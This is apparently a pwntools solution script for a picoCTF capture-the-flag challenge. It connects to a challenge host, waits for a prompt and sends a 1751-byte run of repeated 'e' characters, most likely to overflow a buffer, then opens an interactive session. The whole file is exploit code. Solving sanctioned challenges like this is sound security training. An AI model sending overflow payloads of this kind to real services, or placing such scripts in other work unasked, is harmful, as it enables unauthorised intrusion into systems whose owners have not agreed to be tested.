from pwn import *

host="foggy-cliff.picoctf.net"
port=50804

r = remote(host,port)

r.recvuntil(b'==> ')
r.sendline(b'\x65' * 1751)

r.interactive()
